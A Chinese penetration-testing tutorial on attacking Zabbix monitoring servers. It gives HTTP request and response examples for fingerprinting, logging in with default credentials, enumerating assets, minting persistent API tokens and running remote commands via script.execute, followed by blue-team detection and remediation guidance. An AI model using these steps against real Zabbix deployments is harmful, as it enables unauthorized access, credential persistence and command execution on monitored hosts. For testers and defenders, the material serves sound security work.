---
title: "Zabbix监控平台管理面打点与API利用技术"
date: 2026-06-16T00:15:06+08:00
draft: false
weight: 66
description: "围绕Zabbix监控平台相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "监控平台", "Zabbix"]
---

# Zabbix监控平台管理面打点与API利用技术

`Zabbix` 是典型的高价值监控与运维控制平面。它不只是“一个看图表的监控后台”，而是同时汇聚了：

- 主机、资产组、模板与接口清单
- Agent、SNMP、JMX、IPMI 等监控入口
- 监控项、触发器、问题与事件
- 告警媒介、动作链、脚本与远程命令
- API Token、用户、角色与审计日志

对攻击者来说，Zabbix 的价值不在单个页面，而在于它往往直接暴露：

- 全网主机名、管理 IP 和端口
- 业务分组、模板命名和环境标签
- 故障详情、最近告警与敏感报错
- Web 场景、JMX、SNMP、Agent 接入线索
- 远程脚本执行能力边界
- API Token 与高权限用户的审计轨迹

一旦 Zabbix 前端、`api_jsonrpc.php` 或 SSO 接口暴露到低信任网络、默认账户弱口令未修改、API Token 泄露、历史高权限脚本面可被调用，攻击者通常可以在很短时间内建立完整资产画像，并进一步转向：

- Windows / Linux 资产打点
- SNMP / JMX / IPMI 管理面
- Web 场景目标回收
- `script.execute`、动作链与远程命令能力验证

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 Zabbix
2. 如何围绕 `api_jsonrpc.php`、Token、主机、模板、问题与脚本建立资产画像
3. 如何从脚本执行、API Token、审计日志判断真实风险
4. 哪些请求与响应最值得完整保留
5. 蓝队如何从访问日志、前端日志、审计日志与问题事件识别这类打点

---

## 0. 攻击面概览

### 0.1 常见路径

首轮至少应枚举：

- `/`
- `/zabbix/`
- `/index.php`
- `/zabbix/index.php`
- `/api_jsonrpc.php`
- `/zabbix/api_jsonrpc.php`
- `/chart.php`
- `/chart2.php`
- `/map.php`
- `/latest.php`
- `/history.php`

如果目标为较新版本，还应关注：

- `Authorization: Bearer <token>` 头方式
- 用户角色、API Token 与审计日志 API

### 0.2 认证边界

Zabbix 当前主流认证方式包括：

- 前端用户名密码登录
- `user.login` 获取会话 Token
- API Token
- Web SSO / LDAP / SAML / MFA

官方文档明确说明：

- 所有 API 请求都需要认证或 API Token
- 现在推荐在 Header 中使用 `Authorization: Bearer <token>`

这意味着现实攻击面核心通常不是“有没有 API”，而是：

- 是否能登录前端
- 是否拿到了可用的 API Token
- 当前账号或 Token 的角色到底放到了什么程度

### 0.3 打点收益优先级

按“最快转成真实攻击价值”的顺序，Zabbix 的打点收益一般可排为：

1. 确认是否为 Zabbix，`api_jsonrpc.php` 是否可达
2. 获取会话或 API Token，枚举 hosts、hostgroups、templates、interfaces
3. 枚举 problems、events、items、web 场景和最近故障
4. 判断是否具备 `script.execute`、API Token 管理与审计日志读取能力
5. 判断是否存在远程命令、告警媒介与高权限脚本面

---

## 1. 第一轮打点：确认是否为 Zabbix

### 1.1 首页识别

#### 请求示例

```http
GET /zabbix/ HTTP/1.1
Host: zabbix.target.example
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Set-Cookie: zbx_session=eyJzZXNzaW9uaWQiOiI2ZjY...; HttpOnly; SameSite=Lax
```

页面中常见特征包括：

- `Zabbix`
- `Sign in`
- `Username`
- `Password`

### 1.2 `api_jsonrpc.php` 识别

Zabbix API 的固定入口通常是：

- `/api_jsonrpc.php`

#### 请求示例

```http
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: zabbix.target.example
Content-Type: application/json-rpc
Accept: application/json
Connection: close

{
  "jsonrpc": "2.0",
  "method": "apiinfo.version",
  "params": {},
  "id": 1
}
```

#### 典型响应示例

```json
{
  "jsonrpc": "2.0",
  "result": "7.4.0",
  "id": 1
}
```

这条接口的价值非常高，因为它能直接确认：

- 目标是 Zabbix
- API 可达
- 版本号

### 1.3 旧版登录字段差异

现实环境里仍会遇到老版本 `user.login` 参数使用：

- `user`

而较新文档示例使用：

- `username`

因此自动化脚本在跨版本测试时应兼容这两种写法。

---

## 2. 第二轮打点：认证与 Token

### 2.1 `user.login`

#### 请求示例

```http
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: zabbix.target.example
Content-Type: application/json-rpc
Accept: application/json
Connection: close

{
  "jsonrpc": "2.0",
  "method": "user.login",
  "params": {
    "username": "Admin",
    "password": "zabbix"
  },
  "id": 1
}
```

#### 典型成功响应示例

```json
{
  "jsonrpc": "2.0",
  "result": "bbcfce79a2d95037502f7e9a534906d3466c9a1484beb6ea0f4e7be28e8b8ce2",
  "id": 1
}
```

#### 典型失败响应示例

```json
{
  "jsonrpc": "2.0",
  "error": {
    "code": -32602,
    "message": "Invalid params.",
    "data": "Login name or password is incorrect."
  },
  "id": 1
}
```

### 2.2 Bearer Token 方式

官方当前 API 文档明确推荐：

- `Authorization: Bearer <token>`

#### 请求示例

```http
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: zabbix.target.example
Authorization: Bearer bbcfce79a2d95037502f7e9a534906d3466c9a1484beb6ea0f4e7be28e8b8ce2
Content-Type: application/json-rpc
Accept: application/json
Connection: close

{
  "jsonrpc": "2.0",
  "method": "host.get",
  "params": {
    "output": ["hostid", "host"]
  },
  "id": 2
}
```

### 2.3 API Token 管理面

较新版本中，`token.create`、`token.generate`、`token.get` 构成了新的高价值控制面。

#### `token.get` 请求示例

```http
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: zabbix.target.example
Authorization: Bearer 97f4d8f2...
Content-Type: application/json-rpc
Accept: application/json
Connection: close

{
  "jsonrpc": "2.0",
  "method": "token.get",
  "params": {
    "output": "extend",
    "sortfield": "created_at"
  },
  "id": 3
}
```

#### 典型响应示例

```json
{
  "jsonrpc": "2.0",
  "result": [
    {
      "tokenid": "1",
      "name": "Ops Token",
      "userid": "1",
      "lastaccess": "1760506672",
      "status": "0",
      "expires_at": "0",
      "created_at": "1760400000",
      "creator_userid": "1"
    }
  ],
  "id": 3
}
```

#### `token.create` 请求示例

```http
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: zabbix.target.example
Authorization: Bearer 97f4d8f2...
Content-Type: application/json-rpc
Accept: application/json
Connection: close

{
  "jsonrpc": "2.0",
  "method": "token.create",
  "params": {
    "name": "Temp API Token",
    "userid": "2"
  },
  "id": 4
}
```

#### 典型响应示例

```json
{
  "jsonrpc": "2.0",
  "result": {
    "tokenids": [
      "188"
    ]
  },
  "id": 4
}
```

#### `token.generate` 请求示例

```http
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: zabbix.target.example
Authorization: Bearer 97f4d8f2...
Content-Type: application/json-rpc
Accept: application/json
Connection: close

{
  "jsonrpc": "2.0",
  "method": "token.generate",
  "params": [
    "188"
  ],
  "id": 5
}
```

#### 典型响应示例

```json
{
  "jsonrpc": "2.0",
  "result": [
    {
      "tokenid": "188",
      "token": "fa1258a83d518eabd87698a96bd7f07e5a6ae8aeb8463cae33d50b91dd21bd6d"
    }
  ],
  "id": 5
}
```

这类接口的攻击意义在于：

- 一旦拿到具备 Token 管理权限的账号
- 可以生成长期 API 凭据
- 后续比前端 Cookie 更稳、更适合自动化

---

## 3. 第三轮打点：主机、模板、接口与问题画像

### 3.1 `host.get`

#### 请求示例

```http
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: zabbix.target.example
Authorization: Bearer bbcfce79...
Content-Type: application/json-rpc
Accept: application/json
Connection: close

{
  "jsonrpc": "2.0",
  "method": "host.get",
  "params": {
    "output": ["hostid", "host", "name", "status"],
    "selectInterfaces": ["interfaceid", "type", "ip", "dns", "port"],
    "selectGroups": ["groupid", "name"],
    "selectParentTemplates": ["templateid", "name"]
  },
  "id": 6
}
```

#### 典型响应示例

```json
{
  "jsonrpc": "2.0",
  "result": [
    {
      "hostid": "10084",
      "host": "linux-prod-01",
      "name": "linux-prod-01",
      "status": "0",
      "interfaces": [
        {
          "interfaceid": "1",
          "type": "1",
          "ip": "10.20.41.18",
          "dns": "",
          "port": "10050"
        }
      ],
      "groups": [
        {
          "groupid": "12",
          "name": "Linux Servers"
        }
      ],
      "parentTemplates": [
        {
          "templateid": "10001",
          "name": "Linux by Zabbix agent"
        }
      ]
    }
  ],
  "id": 6
}
```

这条接口可以直接建立：

- 主机清单
- 监控接口类型与端口
- 业务资产分组
- 所挂模板

### 3.2 `template.get`

#### 请求示例

```http
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: zabbix.target.example
Authorization: Bearer bbcfce79...
Content-Type: application/json-rpc
Accept: application/json
Connection: close

{
  "jsonrpc": "2.0",
  "method": "template.get",
  "params": {
    "output": ["templateid", "name", "host"]
  },
  "id": 7
}
```

#### 典型响应示例

```json
{
  "jsonrpc": "2.0",
  "result": [
    {
      "templateid": "10001",
      "host": "Linux by Zabbix agent",
      "name": "Linux by Zabbix agent"
    },
    {
      "templateid": "10200",
      "host": "SNMP Cisco",
      "name": "SNMP Cisco"
    }
  ],
  "id": 7
}
```

模板清单的价值在于：

- 暴露监控覆盖面
- 暴露厂商设备种类
- 帮助推断还有哪些管理面尚未被直接发现

### 3.3 `item.get`

#### 请求示例

```http
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: zabbix.target.example
Authorization: Bearer bbcfce79...
Content-Type: application/json-rpc
Accept: application/json
Connection: close

{
  "jsonrpc": "2.0",
  "method": "item.get",
  "params": {
    "output": ["itemid", "name", "key_", "value_type", "type"],
    "hostids": "10084",
    "limit": 10
  },
  "id": 8
}
```

#### 典型响应示例

```json
{
  "jsonrpc": "2.0",
  "result": [
    {
      "itemid": "25001",
      "name": "Agent ping",
      "key_": "agent.ping",
      "value_type": "3",
      "type": "0"
    },
    {
      "itemid": "25002",
      "name": "CPU utilization",
      "key_": "system.cpu.util[,system,avg1]",
      "value_type": "0",
      "type": "0"
    }
  ],
  "id": 8
}
```

这类响应能帮助判断：

- Agent / SNMP / JMX / HTTP 监控类型
- 目标主机或业务系统的实际监控粒度

### 3.4 `problem.get`

#### 请求示例

```http
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: zabbix.target.example
Authorization: Bearer bbcfce79...
Content-Type: application/json-rpc
Accept: application/json
Connection: close

{
  "jsonrpc": "2.0",
  "method": "problem.get",
  "params": {
    "output": ["eventid", "name", "severity", "clock"],
    "selectHosts": ["hostid", "host"],
    "sortfield": ["eventid"],
    "sortorder": "DESC",
    "limit": 5
  },
  "id": 9
}
```

#### 典型响应示例

```json
{
  "jsonrpc": "2.0",
  "result": [
    {
      "eventid": "456199",
      "name": "MySQL service is down",
      "severity": "4",
      "clock": "1760506903",
      "hosts": [
        {
          "hostid": "10422",
          "host": "mysql-prod-01"
        }
      ]
    }
  ],
  "id": 9
}
```

这类问题面特别适合回收：

- 正在故障的高价值资产
- 暴露在事件名里的服务名
- 维护窗口与异常窗口

### 3.5 `event.get`

#### 请求示例

```http
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: zabbix.target.example
Authorization: Bearer bbcfce79...
Content-Type: application/json-rpc
Accept: application/json
Connection: close

{
  "jsonrpc": "2.0",
  "method": "event.get",
  "params": {
    "output": ["eventid", "clock", "name"],
    "source": 0,
    "sortfield": "clock",
    "sortorder": "DESC",
    "limit": 5
  },
  "id": 10
}
```

#### 典型响应示例

```json
{
  "jsonrpc": "2.0",
  "result": [
    {
      "eventid": "456199",
      "clock": "1760506903",
      "name": "MySQL service is down"
    }
  ],
  "id": 10
}
```

---

## 4. 第四轮打点：脚本、远程命令与高风险控制面

### 4.1 `script.execute`

当前文档中，`Scripts` 仍是 Zabbix API 的高价值对象类。一旦当前用户具备执行脚本的权限，攻击价值会迅速上升。

#### 请求示例

```http
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: zabbix.target.example
Authorization: Bearer bbcfce79...
Content-Type: application/json-rpc
Accept: application/json
Connection: close

{
  "jsonrpc": "2.0",
  "method": "script.execute",
  "params": {
    "scriptid": "3",
    "hostid": "10084"
  },
  "id": 11
}
```

#### 典型成功响应示例

```json
{
  "jsonrpc": "2.0",
  "result": {
    "response": "success",
    "value": "Linux linux-prod-01 5.15.0-102-generic #112-Ubuntu SMP x86_64 GNU/Linux\n"
  },
  "id": 11
}
```

#### 典型失败响应示例

```json
{
  "jsonrpc": "2.0",
  "error": {
    "code": -32500,
    "message": "Application error.",
    "data": "No permissions to referred object or it does not exist!"
  },
  "id": 11
}
```

### 4.2 历史公开利用脚本

Exploit-DB 曾公开过针对 `2.2` 到 `<3.0.3` 的 Zabbix API JSON-RPC 脚本执行链，利用方式是：

- `user.login`
- `script.update`
- `script.execute`

但该问题在社区与上游对其“是否属于漏洞”存在争议，本质前提仍然是已经拿到了足够高权限的 API 会话。对实战的真正意义在于：

- 一旦获得 Super Admin 或等效高权限
- `script.execute` 与脚本更新面会迅速转成主机命令执行

因此在打点方法学里，应把它理解为：

- 不是“未授权 RCE”
- 而是“高权限控制面一旦失守，立即可下沉到受监控主机”

### 4.3 脚本面联动价值

如果当前账号还能看到：

- `script.get`
- `action.get`
- `mediatype.get`

则通常还可以进一步判断：

- 是否存在通过告警动作触发的远程命令
- 是否存在 webhook、短信、邮箱等告警媒介
- 是否存在自动化运维脚本

---

## 5. 第五轮打点：审计日志与高权限行为回溯

### 5.1 `auditlog.get`

官方当前文档明确说明：

- `auditlog.get` 仅对 `Super admin` 可用
- 用户角色还能进一步收紧调用权限

#### 请求示例

```http
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: zabbix.target.example
Authorization: Bearer 97f4d8f2...
Content-Type: application/json-rpc
Accept: application/json
Connection: close

{
  "jsonrpc": "2.0",
  "method": "auditlog.get",
  "params": {
    "output": "extend",
    "sortfield": "clock",
    "sortorder": "DESC",
    "limit": 2
  },
  "id": 12
}
```

#### 典型响应示例

```json
{
  "jsonrpc": "2.0",
  "result": [
    {
      "auditid": "cksstgfam0001yhdcc41y20q2",
      "userid": "1",
      "username": "Admin",
      "clock": "1760507005",
      "ip": "10.10.10.21",
      "action": "1",
      "resourcetype": "9",
      "resourceid": "188",
      "resourcename": "Temp API Token",
      "recordsetid": "cksstgfal0000yhdcso67ondl",
      "details": "{\"token.name\":[\"add\",\"Temp API Token\"],\"token.userid\":[\"add\",\"2\"]}"
    },
    {
      "auditid": "ckssofl0p0001yhdcqxclsg8r",
      "userid": "1",
      "username": "Admin",
      "clock": "1760506950",
      "ip": "10.10.10.21",
      "action": "1",
      "resourcetype": "3",
      "resourceid": "10084",
      "resourcename": "linux-prod-01",
      "details": "{\"host.host\":[\"update\",\"linux-prod-01\",\"linux-old-01\"]}"
    }
  ],
  "id": 12
}
```

这类响应能直接帮你回收：

- 操作者用户名
- 源 IP
- 动作时间
- 修改对象
- 细粒度字段差异

### 5.2 审计面在攻击中的意义

对攻击者来说，如果能读到审计日志，价值包括：

- 判断管理员活动时间
- 判断最近谁在改主机、脚本、Token
- 判断哪些对象最活跃

对蓝队来说，`auditlog.get` 则是最关键的事件回溯面之一。

---

## 6. 高危错误部署场景

### 6.1 默认账户弱口令

现实里最常见的问题仍然是：

- `Admin`
- 弱口令或沿用安装初始密码

一旦登录成功，后续 `/api_jsonrpc.php` 就会立刻转成批量资产导出接口。

### 6.2 API Token 管理过宽

`token.create`、`token.generate` 的危险不在“能新建一个对象”，而在于：

- 一旦某个高权限角色能代替别人管理 Token
- 攻击者可转化出更持久的凭据

### 6.3 `api_jsonrpc.php` 直接暴露

很多环境虽然没有直接暴露 Dashboard 首页，但：

- `/api_jsonrpc.php`

仍然能直接访问。这会让脚本化打点门槛大幅降低。

### 6.4 监控面暴露二次管理面

Zabbix 中的：

- 主机接口 IP
- JMX 端口
- Agent 端口
- Web 场景 URL
- 主机宏

会把其它管理面一并暴露出来，因此 Zabbix 往往不是终点，而是“二次打点索引器”。

### 6.5 脚本面高权限滥用

历史公开利用已经证明，`script.update` 与 `script.execute` 一旦落到高权限账号手里，就会迅速转成：

- 远程命令执行
- 对受监控主机的直接操作

这也是为什么 Zabbix 的风险绝不能只按“监控平台”来评估。

---

## 7. 蓝队检测与处置

### 7.1 反向代理与访问日志

应重点识别对以下路径的连续访问：

- `/api_jsonrpc.php`
- `/chart.php`
- `/chart2.php`
- `/latest.php`
- `/history.php`

以及 JSON-RPC 中的以下 method：

- `apiinfo.version`
- `user.login`
- `host.get`
- `template.get`
- `item.get`
- `problem.get`
- `event.get`
- `script.execute`
- `token.get`
- `token.create`
- `token.generate`
- `auditlog.get`

#### 日志示例

```text
10.10.10.21 - - [16/Jun/2026:05:11:11 +0800] "POST /zabbix/api_jsonrpc.php HTTP/1.1" 200 45 "-" "python-requests/2.32.3"
```

#### 日志示例

```text
10.10.10.21 - - [16/Jun/2026:05:11:14 +0800] "POST /zabbix/api_jsonrpc.php HTTP/1.1" 200 2148 "-" "python-requests/2.32.3"
```

如果后端能记录请求体，进一步看到：

```json
{"method":"host.get","params":{"selectInterfaces":["interfaceid","ip"]}}
```

基本可直接判定为资产枚举阶段。

### 7.2 Zabbix 审计日志

`auditlog.get` 本身就是蓝队最应优先启用和检查的面。应重点关注：

- `username`
- `ip`
- `action`
- `resourcetype`
- `resourcename`
- `details`

尤其要单独审查：

- Token 创建
- 脚本执行
- 用户角色变更
- 主机与模板修改

### 7.3 前端与服务端日志

现实排查中还应同步关注：

- Web 访问日志
- PHP-FPM / Nginx / Apache 错误日志
- Zabbix server 日志
- Zabbix frontend 登录失败与会话异常

#### 日志示例

```text
2026-06-16 05:11:22 [Z3005] query failed: [0] PGRES_FATAL_ERROR: permission denied for table auditlog
```

#### 日志示例

```text
2026-06-16 05:11:29 [trapper] executing script scriptid:3 on hostid:10084 by userid:1
```

### 7.4 处置建议

发现 Zabbix 管理面被打点后，应优先做：

1. 收敛前端与 `/api_jsonrpc.php` 暴露范围
2. 强制修改默认账户与高权限账户密码
3. 轮换所有高风险 API Token
4. 检查是否已经发生 `host.get`、`problem.get`、`script.execute`、`token.generate`、`auditlog.get`
5. 检查脚本、动作链、媒介与远程命令配置
6. 对 Zabbix 中暴露出来的 JMX、SNMP、Agent、Web 场景 URL 做二次收敛

长期建议：

- 仅允许受控网络访问 Zabbix 前端和 API
- 用 API Token 代替长期账户密码，同时最小化 Token 权限
- 对 `script.execute`、`token.*`、`auditlog.get` 建立独立告警
- 定期巡检主机宏、metadata、Web 场景 URL 是否混入敏感信息
- 对高权限用户启用更强认证与最小角色权限

---

## 8. 复盘清单

### 8.1 红队侧

- 是否确认了 `/api_jsonrpc.php` 是否可达
- 是否完成了主机、模板、接口、问题与事件画像
- 是否验证了 `script.execute`、`token.*` 与 `auditlog.get` 的权限边界
- 是否从监控项、模板和告警中挖出其它管理面线索
- 是否识别了默认账户、旧版认证方式与高权限 Token 风险

### 8.2 蓝队侧

- 是否能识别从 `apiinfo.version -> user.login -> host.get -> problem.get` 的连续访问链
- 是否能识别 Token 创建、生成与脚本执行
- 是否掌握了哪些高权限账号可以读审计日志和执行脚本
- 是否知道 Zabbix 当前暴露了哪些二次管理面线索

### 8.3 应急侧

- 是否确认是否已有主机清单、问题列表和审计日志被导出
- 是否确认是否已有脚本被执行或 Token 被新建
- 是否完成高风险账户、Token、脚本和下游管理接口的收敛
- 是否完成对主机接口、JMX、SNMP、Web 场景目标的联动排查

---

## 9. 总结

`Zabbix` 的真正风险，不只是“一个监控后台可以访问”，而在于它会把：

- 资产清单
- 监控接口
- 告警问题
- 模板覆盖面
- 审计日志
- API Token
- 远程脚本能力

统一暴露给同一套前端与 `JSON-RPC` API。

对打点来说，更值得沉淀的方法学是：

- 先确认 `api_jsonrpc.php` 与认证方式
- 再建立主机、模板、接口与问题画像
- 再集中验证 `script.execute`、`token.*` 与 `auditlog.get`
- 最后把 Zabbix 暴露出的二次管理面继续串联下去

只有把这些面串起来，才能把“Zabbix 暴露”真正转化成结构化攻击价值判断。

---

## 参考资料

- [Zabbix API](https://www.zabbix.com/documentation/current/en/manual/api)
- [token.get](https://www.zabbix.com/documentation/current/en/manual/api/reference/token/get)
- [token.create](https://www.zabbix.com/documentation/current/en/manual/api/reference/token/create)
- [token.generate](https://www.zabbix.com/documentation/current/en/manual/api/reference/token/generate)
- [auditlog.get](https://www.zabbix.com/documentation/current/en/manual/api/reference/auditlog/get)
- [Getting started with Zabbix API](https://www.zabbix.com/documentation/1.8/en/api/getting_started)
- [Zabbix API Introduction and Examples](https://sbcode.net/zabbix/zabbix-api-examples/)
- [Exploit-DB 39937](https://www.exploit-db.com/exploits/39937)
- [oss-security discussion on CVE-2016-9140](https://www.openwall.com/lists/oss-security/2016/12/04/1)
